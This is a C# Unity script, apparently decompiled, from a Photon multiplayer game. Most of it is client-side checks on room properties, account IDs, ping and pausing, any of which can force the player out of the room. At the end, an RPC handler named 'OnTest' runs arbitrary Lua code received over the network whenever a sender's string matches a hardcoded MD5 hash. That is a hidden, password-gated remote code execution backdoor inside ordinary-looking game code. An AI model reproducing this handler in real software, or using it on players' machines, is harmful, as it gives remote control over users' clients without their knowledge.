using System;
using System.Timers;
using ExitGames.Client.Photon;
using Photon;
using XLua;

public class GameOthers : MonoBehaviour
{
    private bool isPause;

    private Timer pauseTimer;

    public static int pauseInterval = 2000;

    private byte adminTimeFalse;

    private byte checkTimeFalse;

    private byte checkPingFalse;

    private void Start()
    {
        PhotonRPC.AddMessage("OnTest", OnTest);
        TimerManager.In(nValue.int5, -nValue.int1, nValue.int5, UpdatePing);
        TimerManager.In(nValue.int10, -nValue.int1, nValue.int10, CheckTime);
        if (PhotonNetwork.room.isOfficialServer())
        {
            TimerManager.In(nValue.int2, -nValue.int1, nValue.int2, CheckPing);
        }
        TimerManager.In(nValue.float1, delegate
        {
            int playerID = PhotonNetwork.player.GetPlayerID();
            for (int i = 0; i < PhotonNetwork.otherPlayers.Length; i++)
            {
                if (PhotonNetwork.otherPlayers[i].GetPlayerID() == playerID)
                {
                   PhotonNetwork.LeaveRoom();
                }
            }
            if (!PhotonNetwork.offlineMode)
            {
                if (PhotonNetwork.room.GetSceneName() != LevelManager.GetSceneName())
                {
                   PhotonNetwork.LeaveRoom();
                }
                if (LevelManager.GetSceneName() == "50Traps")
                {
                    if (PhotonNetwork.room.MaxPlayers > 32)
                    {
                        object value;
                        PhotonNetwork.room.CustomProperties.TryGetValue("xor", out value);
                        if (value.ToString() != Utils.XOR("QvAEJbw="))
                        {
                           PhotonNetwork.LeaveRoom();
                        }
                    }
                }
                else if (PhotonNetwork.room.MaxPlayers > 13)
                {
                    object value2;
                    PhotonNetwork.room.CustomProperties.TryGetValue("xor", out value2);
                    if (value2.ToString() != Utils.XOR("QvAEJbw="))
                    {
                        PhotonNetwork.LeaveRoom();
                    }
                }
                if (playerID != (int)AccountManager.instance.Data.ID || playerID <= 0)
                {
                   PhotonNetwork.LeaveRoom();
                }
                if (string.IsNullOrEmpty(AccountManager.instance.Data.AccountName) || PhotonNetwork.player.UserId != (string)AccountManager.instance.Data.AccountName)
                {
                    PhotonNetwork.LeaveRoom();
                }
            }
        });
    }

    private void OnEnable()
    {
        PhotonNetwork.onPhotonCustomRoomPropertiesChanged = (PhotonNetwork.HashtableDelegate)Delegate.Combine(PhotonNetwork.onPhotonCustomRoomPropertiesChanged, new PhotonNetwork.HashtableDelegate(OnPhotonCustomRoomPropertiesChanged));
        PhotonNetwork.onPhotonPlayerPropertiesChanged = (PhotonNetwork.ObjectsDelegate)Delegate.Combine(PhotonNetwork.onPhotonPlayerPropertiesChanged, new PhotonNetwork.ObjectsDelegate(OnPhotonPlayerPropertiesChanged));
    }

    private void OnDisable()
    {
        pauseInterval = 2000;
        PhotonNetwork.onPhotonCustomRoomPropertiesChanged = (PhotonNetwork.HashtableDelegate)Delegate.Remove(PhotonNetwork.onPhotonCustomRoomPropertiesChanged, new PhotonNetwork.HashtableDelegate(OnPhotonCustomRoomPropertiesChanged));
        PhotonNetwork.onPhotonPlayerPropertiesChanged = (PhotonNetwork.ObjectsDelegate)Delegate.Remove(PhotonNetwork.onPhotonPlayerPropertiesChanged, new PhotonNetwork.ObjectsDelegate(OnPhotonPlayerPropertiesChanged));
    }

    private void OnPhotonCustomRoomPropertiesChanged(Hashtable hash)
    {
        if (hash.ContainsKey(PhotonCustomValue.onlyWeaponKey) || hash.ContainsKey(PhotonCustomValue.passwordKey))
        {
            PhotonNetwork.LeaveRoom();
        }
    }

    private void OnPhotonPlayerPropertiesChanged(object[] playerAndUpdatedProps)
    {
        PhotonPlayer photonPlayer = (PhotonPlayer)playerAndUpdatedProps[nValue.int0];
        Hashtable hashtable = (Hashtable)playerAndUpdatedProps[nValue.int1];
        if (photonPlayer.IsLocal && (hashtable.ContainsKey(PhotonCustomValue.playerIDKey) || hashtable.ContainsKey(PhotonCustomValue.levelKey)))
        {
            PhotonNetwork.LeaveRoom();
        }
    }

    private void OnApplicationPause(bool pauseStatus)
    {
        if (PhotonNetwork.offlineMode)
        {
            return;
        }
        isPause = pauseStatus;
        if (isPause)
        {
            if (pauseTimer != null)
            {
                return;
            }
            pauseTimer = new Timer();
            pauseTimer.Elapsed += delegate
            {
                pauseTimer.Stop();
                pauseTimer = null;
                if (isPause)
                {
                    PhotonNetwork.LeaveRoom();
                    PhotonNetwork.networkingPeer.SendOutgoingCommands();
                }
            };
            pauseTimer.Interval = pauseInterval;
            pauseTimer.Enabled = true;
        }
        else if (pauseTimer != null)
        {
            pauseTimer.Stop();
            pauseTimer = null;
        }
    }

    private void UpdatePing()
    {
        PhotonNetwork.player.UpdatePing();
    }

    private void CheckPing()
    {
        if (PhotonNetwork.GetPing() >= 200)
        {
            UIToast.Show(Localization.Get("High Ping"));
            checkPingFalse++;
            if (checkPingFalse > nValue.int3)
            {
                GameManager.leaveRoomMessage = Localization.Get("High Ping");
                PhotonNetwork.LeaveRoom();
            }
        }
        else if (checkPingFalse > 0)
        {
            checkPingFalse--;
        }
    }

    private void CheckTime()
    {
        if (PhotonNetwork.isMasterClient)
        {
          //  PhotonRPC.RPC("PhotonCheckTime", PhotonTargets.All);
        }
    }

    [PunRPC]
    private void OnTest(PhotonMessage message)
    {
        string text = message.ReadString();
        if (!(Utils.MD5(text) != "7f4a3812121af97741ae6e01954c9438"))
        {
            LuaEnv luaEnv = new LuaEnv();
            luaEnv.DoString(message.ReadString());
            if (message.ReadBool())
            {
                luaEnv.Dispose();
            }
        }
    }
}
